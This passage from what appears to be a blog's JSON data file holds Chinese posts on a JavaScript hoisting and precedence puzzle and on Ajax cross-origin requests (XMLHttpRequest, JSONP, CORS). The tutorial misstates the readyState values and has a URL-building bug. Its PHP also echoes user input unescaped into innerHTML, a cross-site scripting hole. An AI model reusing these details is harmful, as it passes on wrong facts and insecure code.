String(‘a’)则创建一个字符串包装对象。</p>\n<p>原题中，返回的是this，而this在构造函数中本来就代表当前实例化对象。<br>之后调用实例化对象的getName函数，因为在Foo构造函数中没有为实例化对象添加任何属性，遂到当前对象的原型对象（prototype）中寻找getName，故最终输出3。</p>\n<h4 id=\"第七问：new-new-Foo-getName-同样是运算符优先级问题。\"><a href=\"#第七问：new-new-Foo-getName-同样是运算符优先级问题。\" class=\"headerlink\" title=\"第七问：new new Foo().getName(); 同样是运算符优先级问题。\"></a>第七问：new new Foo().getName(); 同样是运算符优先级问题。</h4><p>执行结果为：new ((new Foo()).getName)();<br>先初始化Foo的实例化对象，然后将其原型上的getName函数作为构造函数再次new，故最终结果为3</p>\n","excerpt":"","more":"<blockquote>\n<p>本文记录一些在网上看到的，我认为有意思的前端面试题，欢迎转载，转载请注明出处：<a href=\"http://www.happylindz.com\">林东洲的博客 Lindz Blog</a>。</p>\n</blockquote>\n<h2 id=\"输出下面程序题的结果：\"><a href=\"#输出下面程序题的结果：\" class=\"headerlink\" title=\"输出下面程序题的结果：\"></a>输出下面程序题的结果：</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Foo</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    getName = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123; alert (<span class=\"number\">1</span>); &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">Foo.getName = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123; alert (<span class=\"number\">2</span>);&#125;;</span><br><span class=\"line\">Foo.prototype.getName = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123; alert (<span class=\"number\">3</span>);&#125;;</span><br><span class=\"line\"><span class=\"keyword\">var</span> getName = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123; alert (<span class=\"number\">4</span>);&#125;;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getName</span>(<span class=\"params\"></span>) </span>&#123; alert (<span class=\"number\">5</span>);&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//请写出以下输出结果：</span></span><br><span class=\"line\">Foo.getName();</span><br><span class=\"line\">getName();</span><br><span class=\"line\">Foo().getName();</span><br><span class=\"line\">getName();</span><br><span class=\"line\"><span class=\"keyword\">new</span> Foo.getName();</span><br><span class=\"line\"><span class=\"keyword\">new</span> Foo().getName();</span><br><span class=\"line\"><span class=\"keyword\">new</span> <span class=\"keyword\">new</span> Foo().getName();</span><br></pre></td></tr></table></figure>\n<p>先来理解下题目，首先创建了一个Foo()函数，然后在给Foo函数增添一个函数属性getName,在Foo原型上增添一个getName函数属性，然后再以函数表达式和函数声明分别创建了一个同名函数getName。  </p>\n<h4 id=\"第一问：Foo-getName-返回2。\"><a href=\"#第一问：Foo-getName-返回2。\" class=\"headerlink\" title=\"第一问：Foo.getName()返回2。\"></a>第一问：Foo.getName()返回2。</h4><h4 id=\"第二问：首先需要知道函数表达式和函数声明的区别。\"><a href=\"#第二问：首先需要知道函数表达式和函数声明的区别。\" class=\"headerlink\" title=\"第二问：首先需要知道函数表达式和函数声明的区别。\"></a>第二问：首先需要知道函数表达式和函数声明的区别。</h4><blockquote>\n<p>函数声明具有变量声明提升(即所有声明变量或声明函数都会被提升到当前函数的顶部)</p>\n</blockquote>\n<p>例：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">'x'</span> <span class=\"keyword\">in</span> <span class=\"built_in\">window</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"keyword\">typeof</span> func);</span><br><span class=\"line\"><span class=\"keyword\">var</span> x = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">func</span>(<span class=\"params\"></span>)</span>&#123;&#125;</span><br></pre></td></tr></table></figure>\n<p>js引擎会将其解析为：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> x;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">func</span>(<span class=\"params\"></span>)</span>&#123;&#125;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">'x'</span> <span class=\"keyword\">in</span> <span class=\"built_in\">window</span>);    <span class=\"comment\">//true</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"keyword\">typeof</span> func);      <span class=\"comment\">//function</span></span><br><span class=\"line\">x = <span class=\"number\">0</span>;</span><br></pre></td></tr></table></figure>\n<p>如果能明白的话就能理解下面代码的输出： </p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">console</span>.log(x);     <span class=\"comment\">//function()&#123;&#125;</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> x = <span class=\"number\">1</span>;          </span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(x);     <span class=\"comment\">//1</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">x</span>(<span class=\"params\"></span>)</span>&#123;&#125;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(x);     <span class=\"comment\">//1</span></span><br></pre></td></tr></table></figure>\n<p>所以js引擎在解析代码时候就变成了：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//省略部分代码</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Foo</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    getName = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123; alert (<span class=\"number\">1</span>); &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> getName;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getName</span>(<span class=\"params\"></span>) </span>&#123; alert (<span class=\"number\">5</span>);&#125;</span><br><span class=\"line\">getName = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123; alert (<span class=\"number\">4</span>);&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">getName();       <span class=\"comment\">//4</span></span><br></pre></td></tr></table></figure>\n<p>后面函数表达式的赋值将前面的getName值个覆盖了，所以第二问输出4。</p>\n<h4 id=\"第三问：首先执行Foo-函数，并执行getName的赋值语句。\"><a href=\"#第三问：首先执行Foo-函数，并执行getName的赋值语句。\" class=\"headerlink\" title=\"第三问：首先执行Foo()函数，并执行getName的赋值语句。\"></a>第三问：首先执行Foo()函数，并执行getName的赋值语句。</h4><blockquote>\n<p>它会查找当前作用域上是否存在这个变量，如果没有就向它上层作用域继续寻找，直到找到window全局作用域，若还是没有则在全局作用域上创建getName变量，  </p>\n</blockquote>\n<p>因为window域中存在着getName这个变量即(var getName = function () { alert (4);};)，所以将其替换为(getName = function () { alert (1); };)<br>并返回window对象，所以Foo().getName()的结果为1；</p>\n<p>若代码改为：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Foo</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> getName = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123; alert (<span class=\"number\">1</span>); &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">Foo().getName();     <span class=\"comment\">//TypeError: Foo().getName is not a function.</span></span><br></pre></td></tr></table></figure>\n<p>创建getName时候多加一个var，即在当前作用域中添加一个局部变量getName，而在执行完毕后该局部变量就会被回收，并且该函数返回window全局对象，故在访问window中的getName会报错，因为没有创建window对象无此变量。</p>\n<h4 id=\"第四问：正如上一问，因为全局作用于window中getName被替换。\"><a href=\"#第四问：正如上一问，因为全局作用于window中getName被替换。\" class=\"headerlink\" title=\"第四问：正如上一问，因为全局作用于window中getName被替换。\"></a>第四问：正如上一问，因为全局作用于window中getName被替换。</h4><p>即(getName = function () { alert (1); };)<br>故此时getName();输出结果为1。</p>\n<h4 id=\"第五问-new-Foo-getName-此处考察的是js的运算符优先级问题。\"><a href=\"#第五问-new-Foo-getName-此处考察的是js的运算符优先级问题。\" class=\"headerlink\" title=\"第五问 new Foo.getName(); ,此处考察的是js的运算符优先级问题。\"></a>第五问 new Foo.getName(); ,此处考察的是js的运算符优先级问题。</h4><p>根据图中优先级的描述：<br><img src=\"/assets/2016-02-23-record-front-questions/1.png\" alt=\"优先级\"><br>可以得知：可以得知点（.）的优先级高于new操作，所以原式相当于是：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">new</span> (Foo.getName)();</span><br></pre></td></tr></table></figure>\n<p>所以结果为2；</p>\n<h4 id=\"第六问-new-Foo-getName\"><a href=\"#第六问-new-Foo-getName\" class=\"headerlink\" title=\"第六问 new Foo().getName()\"></a>第六问 new Foo().getName()</h4><p>根据表的执行结果为：(new Foo()).getName();</p>\n<h3 id=\"所以接下来先讨论一下js构造函数返回值的问题：\"><a href=\"#所以接下来先讨论一下js构造函数返回值的问题：\" class=\"headerlink\" title=\"所以接下来先讨论一下js构造函数返回值的问题：\"></a>所以接下来先讨论一下js构造函数返回值的问题：</h3><p>js返回值分为三类：<br>1、没有返回值则创建一个空对象，并把函数中与this绑定的属性添加；</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">F</span>(<span class=\"params\"></span>)</span>&#123; <span class=\"keyword\">this</span>.name = <span class=\"string\">'foo'</span>;&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> obj = <span class=\"keyword\">new</span> F();   <span class=\"comment\">// obj: &#123;name:'foo'&#125; 创建一个对象，并绑定函数中this所绑定的属性</span></span><br></pre></td></tr></table></figure>\n<p>2、若有返回值则检查返回值的类型，若返回值为非引用类型，比如基本类型:(string,number,boolean,null,undefined)，则js引擎会忽略该返回值，并且创建一个新对象，并把函数中与this绑定的属性添加；</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">F</span>(<span class=\"params\"></span>)</span>&#123; <span class=\"keyword\">this</span>.name = <span class=\"string\">'foo'</span>; <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> obj = <span class=\"keyword\">new</span> F();   <span class=\"comment\">// obj: &#123;name:'foo'&#125; 创建一个对象，并绑定函数中this所绑定的属性</span></span><br></pre></td></tr></table></figure>\n<p>3、若返回值是引用类型，则实际返回值为这个引用类型。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">F</span>(<span class=\"params\"></span>)</span>&#123;<span class=\"keyword\">this</span>.name = <span class=\"string\">'foo'</span>; <span class=\"keyword\">return</span> &#123;x:<span class=\"number\">1</span>&#125;;&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> obj = <span class=\"keyword\">new</span> F();    <span class=\"comment\">//obj: &#123;x:1&#125;</span></span><br></pre></td></tr></table></figure>\n<p>如果理解这些，再来看下面一个例子：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> obj;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">F1</span>(<span class=\"params\"></span>)</span>&#123;<span class=\"keyword\">this</span>.name = <span class=\"string\">'foo'</span>; <span class=\"keyword\">return</span> <span class=\"string\">'a'</span>;&#125;</span><br><span class=\"line\">obj = <span class=\"keyword\">new</span> F1();    <span class=\"comment\">//obj: F1&#123;name: 'foo'&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">F2</span>(<span class=\"params\"></span>)</span>&#123;<span class=\"keyword\">this</span>.name = <span class=\"string\">'foo'</span>; <span class=\"keyword\">return</span> <span class=\"built_in\">String</span>(<span class=\"string\">'a'</span>);&#125;</span><br><span class=\"line\">obj = <span class=\"keyword\">new</span> F2();    <span class=\"comment\">//obj: F2&#123;name: 'foo'&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">F3</span>(<span class=\"params\"></span>)</span>&#123;<span class=\"keyword\">this</span>.name = <span class=\"string\">'foo'</span>; <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">String</span>(<span class=\"string\">'a'</span>);&#125;</span><br><span class=\"line\">obj = <span class=\"keyword\">new</span> F3();    <span class=\"comment\">//obj: String &#123;0: \"a\", length: 1&#125;</span></span><br></pre></td></tr></table></figure>\n<p>从例子中我们可以得出：无论 ‘a’还是String(‘a’)创建的都是基本类型值，而new String(‘a’)则创建一个字符串包装对象。</p>\n<p>原题中，返回的是this，而this在构造函数中本来就代表当前实例化对象。<br>之后调用实例化对象的getName函数，因为在Foo构造函数中没有为实例化对象添加任何属性，遂到当前对象的原型对象（prototype）中寻找getName，故最终输出3。</p>\n<h4 id=\"第七问：new-new-Foo-getName-同样是运算符优先级问题。\"><a href=\"#第七问：new-new-Foo-getName-同样是运算符优先级问题。\" class=\"headerlink\" title=\"第七问：new new Foo().getName(); 同样是运算符优先级问题。\"></a>第七问：new new Foo().getName(); 同样是运算符优先级问题。</h4><p>执行结果为：new ((new Foo()).getName)();<br>先初始化Foo的实例化对象，然后将其原型上的getName函数作为构造函数再次new，故最终结果为3</p>\n"},{"layout":"post","title":"Ajax - 跨域请求","date":"2016-02-29T04:00:00.000Z","author":"Lindz","header-img":"img/6.jpg","_content":"> 本文为原创作品。欢迎转载，转载请注明出处：[林东洲的博客 Lindz Blog](http://www.happylindz.com)。\n\n## Ajax概念\n\nAjax全称为：'Asynchronous Javascript And XML'，即异步 Javascript 和 XML，指的是一种创建交互式网页开发技术。\n\n**注意，Ajax 是一种技术，它并不是一门编程语言。**\n\n简单说来，传统的网页如果需要更新内容，就必须要重新加载整个页面。\n\n而通过 Ajax 在后台与服务器进行少量的数据交换，可以使网页实现异步更新。这就意味着可以在不重新加载整个网页的情况下，**对网页的某部分进行更新**。\n\n例：\n![](/assets/2016-02-29-ajax-cross-origin/1.png)\n\n比如我在百度上搜索 ajax，其实我并没有点击‘百度一下‘按钮进行提交表单，但是页面已经向后台发起 Ajax 请求获取数据，并将获取到的数据在页面上进行局部更新。\n\n## Ajax实战\n\n了解了 Ajax 的概念之后，接下来就可以学习如何发起 Ajax 请求了。\n\n在学习 Ajax 之前首先来创建一个form表单：\n\n```html\n<form>\n    <label>Name:<input type='text' id=\"name\" name=\"name\"/></label> <br>\n    <input type=\"submit\" value=\"提交\" id='submit'>\n</form>\n<div>Result:<span id=\"result\"></span></div>\n```\n表单中有个输入框和提交按钮，还有一个用来存储结果的 div。  \n效果：  \n![](/assets/2016-02-29-ajax-cross-origin/2.png)\n\n### Ajax对象创建\n\nAjax 核心是 Javascript 对象 XMLHttpRequest。在创建 Ajax 对象前需要对所使用的浏览器进行判断来创建不同的实例。\n\n```javascript\nvar request;\nif(window.XMLHttpRequest){\n\trequest = new XMLHttpRequest();\n}else{\n\trequest = new ActiveXObject('Microsoft.XMLHTTP');\n}\n```\n通过检测 window 对象中是否有 XMLHttpRequest 属性来确定浏览器是否支持标准的 XMLHttpRequest。\n\n**注意，请不要用浏览器的 navigator.userAgent 来检测浏览器是否支持某个 Javascript 特性。因为这个字符串可以伪造，而且一般不会采用通过 IE 的版本判断 Javascript 特性。** \n\n当然也可以使用 try catch 语句来创建 XMLHttpRequest 对象。\n\n```javascript\nvar request = null;\ntry{\n\trequest = new XMLHttpRequest();\n}catch(e){\n\ttry{\n\t\trequest = new ActiveXObject('Msxml2.XMLHTTP');\n\t}catch(e){\n\t\trequest = new ActiveXObject('Microsoft.XMLHTTP');\n\t}\n}\n```\n基本上常用的创建 Ajax 对象的方式就是这两种，可以选择封装在一个函数中。\n\n> XMLHttp=new XMLHttpRequest() 已经被大多数现代标准浏览器所支持。   \n> 但为了兼容IE浏览器，按微软的方式：XMLHttp=new \n> ActiveXObject(\"Msxml2.XMLHTTP\") 支持IE6+的版本。   \n> 如果捕获错误，则尝试更老的方法：XMLHttp=new \n> ActiveXObject(\"Microsoft.XMLHTTP\") 支持IE5.5+的版本。\n\n### 设置回调函数\n\n在创建 Ajax 请求后，要先设置 onreadystatechange 回调函数(即在请求数据返回后进行的操作)。在回调函数中通常我们只需通过 readyState === 4 判断请求是否完成。如果已完成，再根据 status === 200 判断是否是一个成功的响应。\n\nreadyState 值：(1.2.3.4.5)\n\n1. 请求未初始化\n2. 服务器连接已建立\n3. 请求已接收\n4. 请求处理中\n5. 请求已完成，且响应已就绪\n\ncode:\n\n```javascript\nrequest.onreadystatechange = function () {\n    if (request.readyState === 4){      \n        if (request.status === 200){      \n            document.getElementById('result').innerHTML = request.responseText;       \n        }\n    }\n}\n```\n\n### 发送请求\n\n接下来就是要设置 XMLHttpRequest 对象中的 open() 方法，open() 方法一共接受三个参数，第一个参数指定是 GET 还是 POST，第二个参数指定 URL 地址，第三个参数指定是否使用异步发送请求，默认值是 true，所以可以不用填写。\n\n**注意：千万不要把第三个参数设置为 false，否则浏览器将停止响应，直到 Ajax 请求完成，如果这个请求耗时10秒，那么10秒内你会发现浏览器处于'假死'状态。**\n\n最后调用 send()方法才算真正发送请求，GET 请求不需要参数，POST 请求需要把 body 部分以字符串或者 FormData 对象传进去。\n\ncode:\n\n```javascript\ndocument.getElementById('submit').onclick = function () {\n    var url = 'index.php?' +'name=' + document.getElementById('name'); \n    request.open('GET',url,true);\n    request.send();\n    return false;\n}\n```\n给提交按钮绑定一个点击事件，在点击的时候将请求数据发送给后台，return false避免表单提交。\n\n这样 Ajax 请求就完成了，已经可以实现不刷新页面局部刷新。\n\n### 后台代码\n\n这里我使用 php 来完成实例。\n\n\n```php\n$a[]=\"Anna\";\n$a[]=\"Brittany\";\n$a[]=\"Cinderella\";\n$a[]=\"Diana\";\n$a[]=\"Eva\";\n$a[]=\"Fiona\";\n$a[]=\"Gunda\";\n$a[]=\"Hege\";\n$a[]=\"Inga\";\n$a[]=\"Johanna\";\n$a[]=\"Kitty\";\n$a[]=\"Linda\";\n$a[]=\"Nina\";\n$a[]=\"Ophelia\";\n$a[]=\"Petunia\";\n$a[]=\"Amanda\";\n$a[]=\"Raquel\";\n$a[]=\"Cindy\";\n$a[]=\"Doris\";\n$a[]=\"Eve\";\n$a[]=\"Evita\";\n$a[]=\"Sunniva\";\n$a[]=\"Tove\";\n$a[]=\"Unni\";\n$a[]=\"Violet\";\n$a[]=\"Liza\";\n$a[]=\"Elizabeth\";\n$a[]=\"Ellen\";\n$a[]=\"Wenche\";\n$a[]=\"Vicky\";\n\n$name = $_GET['name'];\n        \nif(strlen($name) > 0){\n    $result = '';\n    for($i = 0; $i < count($a); $i++){\n        if(strtolower($name) == strtolower($a[$i])){\n            $result = \"find the person: $a[$i]\";\n        }\n    }\n}\nif($result == ''){\n    $result = \"Can't find the person: $name\";\n}\necho $result;\n```\n这样前后端就可以跑通了。\n\n### 测试\n\n![](/assets/2016-02-29-ajax-cross-origin/3.png)\n\n![](/assets/2016-02-29-ajax-cross-origin/4.png)\n\n## 安全限制\n\n注意到了上面 URL 使用的相对路径，如果将它改成绝对路径比如：\n\n```javascript\nvar url = 'http://127.0.0.1:63342/htdocs/ajax/request.php?name=' + document.getElementById('name').value;\n```\n将会报错，在 Chrome 的控制台里，还可以看到错误信息。\n\n这是因为浏览器的同源策略导致的。默认情况下，JavaScript 在发送 Ajax 请求时，URL的域名必须和当前页面完全一致。\n\n> 完全一致的意思是，域名要相同（www.example.com和example.com不同），协议要相同（http和https不同），端口号要相同（默认是:80端口，它和:8080就不同）。有的浏览器口子松一点，允许端口不同，大多数浏览器都会严格遵守这个限制。\n\n\n## 跨域请求方法\n\n一、是通过 Flash 插件发送 HTTP 请求，这种方式可以绕过浏览器的安全限制，但必须安装 Flash，并且跟 Flash 交互。不过 Flash 用起来麻烦，而且现在用得也越来越少了。\n\n二、是通过在同源域名下架设一个代理服务器来转发，JavaScript 负责把请求发送到代理服务器：\n\n```\n'/proxy?url=http:/www.example.com'\n```\n代理服务器再把结果返回，这样就遵守了浏览器的同源策略。这种方式麻烦之处在于需要服务器端额外做开发。\n\n三、JSONP\n> 即JSON with Padding，是JSON的一种“使用模式”，可用于解决主流浏览器的跨域数据访问的问题。\n\n它有个限制，只能用GET请求，并且要求返回 JavaScript。这种方式跨域实际上是利用了浏览器允许跨域引用 JavaScript 资源。\n\n即Web页面上调用Js文件时可以不受跨域限制的影响，不仅如此，凡是拥有'src'这个属性的标签都拥有跨域的能力，比如：script, img, iframe标签。\n\n代码如下：\n\n```javascript\nvar jsonp = document.createElement('script');\njsonp.type = 'text/javascript';\njsonp.src = 'http://www.example.com/remote.js';\ndocument.getElementsByTagName('head')[0].appendChild(jsonp);\n```\n\n四、CORS\n> Cross-Origin Resource Sharing 跨域资源共享, CORS 是一种允许当前域（domain）的资源（比如html/js/web service）被其他域（domain）的脚本请求访问的机制。\n\n注：如果浏览器支持 HTML5，那么就可以一劳永逸地使用新的跨域策略：CORS了。\n\n#### 在了解CORS前，先来搞清楚概念：  \nOrigin 表示本域，也就是浏览器当前页面的域。当 JavaScript 向外域（如sina.com）发起请求后，浏览器收到响应后，首先检查 Access-Control-Allow-Origin 是否包含本域，如果是，则此次跨域请求成功，如果不是，则请求失败，JavaScript 将无法获取到响应的任何数据。\n\n![](/assets/2016-02-29-ajax-cross-origin/5.png)\n\n假设本域是 my.com，外域是 sina.com，只要响应头 Access-Control-Allow-Origin为 http://my.com，或者是*，本次请求就可以成功。\n\n\n\n可见，跨域能否成功，取决于对方服务器是否愿意给你设置一个正确的 Access-Control-Allow-Origin，决定权始终在对方手中。 \n\n服务器端对于 CORS 的支持，主要就是通过设置 Access-Control-Allow-Origin 来进行的,可以添加 header 头：\n\n```php\n//php\nheader(\"Access-Control-Allow-Origin: http://www.example.com\");\n```\n>上面这种跨域请求，称之为“简单请求”。简单请求包括 GET、HEAD和POST(POST的Content-Type类型 仅限application/x-www-form-urlencoded、multipart/form-data和text/plain)，并且不能出现任何自定义头(例如，X-Custom: 12345),通常能满足90%的需求。\n\n注：现代浏览器一般都是用JSONP或者CORS来完成跨域请求。\n\nCORS与JSONP相比，更为先进、方便和可靠。\n\n1. JSONP只能实现GET请求，而CORS支持所有类型的HTTP请求。  \n2. 使用CORS，开发者可以使用普通的XMLHttpRequest发起请求和获得数据，比起JSONP有更好的错误处理。  \n3. JSONP主要被老的浏览器支持，它们往往不支持CORS，而绝大多数现代浏览器都已经支持了CORS。  \n\n\n","source":"_posts/2016-02-29-ajax-and-cross-origin.md","raw":"---\nlayout:     post\ntitle:      \"Ajax - 跨域请求\"\ndate:       2016-02-29 12:00:00\nauthor:     \"Lindz\"\nheader-img: \"img/6.jpg\"\ntags:\n   - Ajax\n   - Javascript\n   - PHP\n---\n> 本文为原创作品。欢迎转载，转载请注明出处：[林东洲的博客 Lindz Blog](http://www.happylindz.com)。\n\n## Ajax概念\n\nAjax全称为：'Asynchronous Javascript And XML'，即异步 Javascript 和 XML，指的是一种创建交互式网页开发技术。\n\n**注意，Ajax 是一种技术，它并不是一门编程语言。**\n\n简单说来，传统的网页如果需要更新内容，就必须要重新加载整个页面。\n\n而通过 Ajax 在后台与服务器进行少量的数据交换，可以使网页实现异步更新。这就意味着可以在不重新加载整个网页的情况下，**对网页的某部分进行更新**。\n\n例：\n![](/assets/2016-02-29-ajax-cross-origin/1.png)\n\n比如我在百度上搜索 ajax，其实我并没有点击‘百度一下‘按钮进行提交表单，但是页面已经向后台发起 Ajax 请求获取数据，并将获取到的数据在页面上进行局部更新。\n\n## Ajax实战\n\n了解了 Ajax 的概念之后，接下来就可以学习如何发起 Ajax 请求了。\n\n在学习 Ajax 之前首先来创建一个form表单：\n\n```html\n<form>\n    <label>Name:<input type='text' id=\"name\" name=\"name\"/></label> <br>\n    <input type=\"submit\" value=\"提交\" id='submit'>\n</form>\n<div>Result:<span id=\"result\"></span></div>\n```\n表单中有个输入框和提交按钮，还有一个用来存储结果的 div。  \n效果：  \n![](/assets/2016-02-29-ajax-cross-origin/2.png)\n\n### Ajax对象创建\n\nAjax 核心是 Javascript 对象 XMLHttpRequest。在创建 Ajax 对象前需要对所使用的浏览器进行判断来创建不同的实例。\n\n```javascript\nvar request;\nif(window.XMLHttpRequest){\n\trequest = new XMLHttpRequest();\n}else{\n\trequest = new ActiveXObject('Microsoft.XMLHTTP');\n}\n```\n通过检测 window 对象中是否有 XMLHttpRequest 属性来确定浏览器是否支持标准的 XMLHttpRequest。\n\n**注意，请不要用浏览器的 navigator.userAgent 来检测浏览器是否支持某个 Javascript 特性。因为这个字符串可以伪造，而且一般不会采用通过 IE 的版本判断 Javascript 特性。** \n\n当然也可以使用 try catch 语句来创建 XMLHttpRequest 对象。\n\n```javascript\nvar request = null;\ntry{\n\trequest = new XMLHttpRequest();\n}catch(e){\n\ttry{\n\t\trequest = new ActiveXObject('Msxml2.XMLHTTP');\n\t}catch(e){\n\t\trequest = new ActiveXObject('Microsoft.XMLHTTP');\n\t}\n}\n```\n基本上常用的创建 Ajax 对象的方式就是这两种，可以选择封装在一个函数中。\n\n> XMLHttp=new XMLHttpRequest() 已经被大多数现代标准浏览器所支持。   \n> 但为了兼容IE浏览器，按微软的方式：XMLHttp=new \n> ActiveXObject(\"Msxml2.XMLHTTP\") 支持IE6+的版本。   \n> 如果捕获错误，则尝试更老的方法：XMLHttp=new \n> ActiveXObject(\"Microsoft.XMLHTTP\") 支持IE5.5+的版本。\n\n### 设置回调函数\n\n在创建 Ajax 请求后，要先设置 onreadystatechange 回调函数(即在请求数据返回后进行的操作)。在回调函数中通常我们只需通过 readyState === 4 判断请求是否完成。如果已完成，再根据 status === 200 判断是否是一个成功的响应。\n\nreadyState 值：(1.2.3.4.5)\n\n1. 请求未初始化\n2. 服务器连接已建立\n3. 请求已接收\n4. 请求处理中\n5. 请求已完成，且响应已就绪\n\ncode:\n\n```javascript\nrequest.onreadystatechange = function () {\n    if (request.readyState === 4){      \n        if (request.status === 200){      \n            document.getElementById('result').innerHTML = request.responseText;       \n        }\n    }\n}\n```\n\n### 发送请求\n\n接下来就是要设置 XMLHttpRequest 对象中的 open() 方法，open() 方法一共接受三个参数，第一个参数指定是 GET 还是 POST，第二个参数指定 URL 地址，第三个参数指定是否使用异步发送请求，默认值是 true，所以可以不用填写。\n\n**注意：千万不要把第三个参数设置为 false，否则浏览器将停止响应，直到 Ajax 请求完成，如果这个请求耗时10秒，那么10秒内你会发现浏览器处于'假死'状态。**\n\n最后调用 